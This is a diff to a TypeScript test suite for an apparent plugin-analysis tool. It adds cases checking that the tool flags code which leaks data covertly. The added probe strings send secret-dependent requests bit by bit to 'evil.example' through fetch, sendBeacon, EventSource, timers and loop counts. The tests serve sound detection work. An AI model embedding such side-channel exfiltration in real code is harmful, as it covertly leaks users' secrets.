@@ -610,6 +610,36 @@ describe("a choice made by what was read is a way out, too", () => {
     });
   }
 
+  describe("what is called under the branch is not told by its name: anything not known harmless is a way out", () => {
+    const bit = (call: string, pre = ""): string => `${pre}\n for (let i = 0; i < 64; i++) { if (t.charCodeAt(i) & 1) { ${call} } }`;
+    const probes: Record<string, string> = {
+      alias_fetch_branch: bit(`await f("https://evil.example/" + i);`, `const f = (globalThis as any).fetch;`),
+      beacon_branch: bit(`(globalThis as any).navigator.sendBeacon("https://evil.example/" + i);`),
+      eventsource_branch: bit(`new (globalThis as any).EventSource("https://evil.example/" + i);`),
+      unknown_obj_branch: bit(`c.ping(i);`, `const c = (globalThis as any).someClient;`),
+      promise_race: `await new Promise<void>((r) => setTimeout(r, (t.charCodeAt(0) & 1) * 1000)); await fetch("https://evil.example/tick");`,
+      loop_break: `let k = 0; while (true) { if (t.charCodeAt(k) === 0) break; k++; } for (let j = 0; j < k; j++) await fetch("https://evil.example/x");`,
+      then_after_timer: `await new Promise<void>((r) => setTimeout(r, t.length * 10)).then(() => fetch("https://evil.example/tick"));`,
+      compound_counter: `let k = 0; for (const ch of t) { if (ch === "a") k += 1; } for (let j = 0; j < k; j++) await fetch("https://evil.example/x");`,
+    };
+    for (const [name, body] of Object.entries(probes)) {
+      it(`${name}: not «никуда», red or unknown`, async () => {
+        const r = await check(spyOn(body));
+        const f = flowOf(r, "threads");
+        expect(f.verdict).not.toBe("nowhere");
+        expect(["leaves", "unknown"]).toContain(f.verdict);
+        // the network is in the plugin: a call under a choice is red, as before the analysis
+        // with the network in the plugin it is red as before the analysis; with nothing that names a way out it is yellow, never «safe»
+        expect(headline(r).level).toBe(f.verdict === "leaves" || r.capabilities.some((c) => c.kind === "network") ? "danger" : "caution");
+        expect(flowTokens(r.flows).length).toBeGreaterThan(0);
+      });
+    }
+    it("the harmless trifles under a branch stay harmless: a sound player, a timer handle, a clock", async () => {
+      const r = await check(spyOn(`if (t.length > 3) { const a = new (globalThis as any).Audio("x.wav"); a.play(); const h = setTimeout(() => {}, 5); (h as any).unref(); void AbortSignal.timeout(100); void performance.now(); clearTimeout(h); }`));
+      expect(flowOf(r, "threads").verdict).toBe("nowhere");
+    });
+  });
+
   it("a choice among constant addresses: `fetch(ok ? a : b)`", async () => {
     const r = await check(spyOn(`const ok = t.length > 10; await fetch(ok ? "https://a.example/" : "https://b.example/");`));
     expect(flowOf(r, "threads").verdict).toBe("leaves");
